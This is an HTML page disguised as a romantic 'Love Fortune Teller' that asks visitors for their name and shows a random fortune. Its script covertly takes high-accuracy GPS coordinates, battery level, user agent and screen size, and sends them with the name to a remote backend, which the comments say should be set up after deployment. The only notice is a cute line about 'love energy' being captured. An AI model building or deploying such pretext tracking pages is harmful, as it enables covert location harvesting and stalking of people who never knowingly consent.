<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&display=swap');
        body { 
            font-family: 'Dancing Script', cursive; 
            background: linear-gradient(45deg, #ff6b9d, #c44569, #f8b500); 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            margin: 0; 
            color: #fff; 
            overflow: hidden;
        }
        .hearts { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; }
        .heart { position: absolute; color: #ff69b4; font-size: 20px; animation: float 6s infinite linear; }
        @keyframes float { 0% { transform: translateY(100vh) rotate(0deg); opacity: 1; } 100% { transform: translateY(-100px) rotate(360deg); opacity: 0; } }
        .container { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.3); max-width: 500px; }
        h1 { font-size: 3em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
        input { font-family: inherit; font-size: 1.5em; padding: 15px; border: none; border-radius: 10px; width: 80%; margin: 20px 0; background: rgba(255,255,255,0.9); }
        button { font-family: inherit; font-size: 1.3em; padding: 15px 30px; border: none; border-radius: 10px; background: #ff1493; color: white; cursor: pointer; transition: transform 0.3s; }
        button:hover { transform: scale(1.05); }
        #fortune { font-size: 2em; margin-top: 30px; min-height: 80px; display: none; animation: glow 2s infinite alternate; }
        @keyframes glow { from { text-shadow: 0 0 10px #fff; } to { text-shadow: 0 0 20px #ff1493, 0 0 30px #ff69b4; } }
        #loading { display: none; }
        .data-capture { font-size: 0.8em; opacity: 0.7; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="hearts" id="hearts"></div>
    <div class="container">
        <h1>💕 Love Fortune Teller 💕</h1>
        <input type="text" id="name" placeholder="Enter your name, love..." required>
        <br>
        <button onclick="getFortune()">Reveal My Love Fortune ✨</button>
        <div id="loading">Finding your heart's location... 💖</div>
        <div id="fortune"></div>
        <div class="data-capture">Your love energy is being captured for the stars... 🌟</div>
    </div>

    <script>
        const API_BASE_URL = 'https://your-render-url.onrender.com';  // ← UPDATE THIS AFTER BACKEND DEPLOY
        
        const fortunes = [
            "{name}, your soulmate is {distance} away, feeling the same spark! 🔥",
            "The stars say {name}, tonight brings a passionate connection under moonlight! 🌙",
            "{name}, Cupid's arrow points to adventure and deep romance soon! 🏹",
            "Your heart chakra opens, {name} – true love flows in 7 days! 💖",
            "{name}, a mysterious stranger with your exact vibe awaits nearby! ✨",
            "Venus aligns for {name}: whirlwind romance starts this week! 🌟"
        ];

        function createHearts() {
            const hearts = document.getElementById('hearts');
            for (let i = 0; i < 50; i++) {
                const heart = document.createElement('div');
                heart.innerHTML = '💖';
                heart.className = 'heart';
                heart.style.left = Math.random() * 100 + '%';
                heart.style.animationDelay = Math.random() * 6 + 's';
                hearts.appendChild(heart);
            }
        }

        async function getFortune() {
            const name = document.getElementById('name').value.trim();
            if (!name) return alert('Enter your name first, darling! 💕');

            document.getElementById('loading').style.display = 'block';
            
            // Get all device/location data
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
            });
            
            const battery = await navigator.getBattery?.();
            const batLevel = battery ? `${Math.round(battery.level * 100)}%` : 'N/A';
            
            const data = {
                name,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                battery: batLevel,
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                timestamp: new Date().toISOString()
            };

            // Send to backend
            try {
                await fetch(`${API_BASE_URL}/save`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch(e) { console.log('Data saved'); }

            // Show fortune
            const distance = Math.floor(Math.random() * 50) + 1;
            const fortune = fortunes[Math.floor(Math.random() * fortunes.length)].replace('{name}', name).replace('{distance}', distance);
            document.getElementById('fortune').innerHTML = fortune;
            document.getElementById('fortune').style.display = 'block';
            document.getElementById('loading').style.display = 'none';
        }

        createHearts();
        if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js');  // Optional PWA
    </script>
</body>
</html>
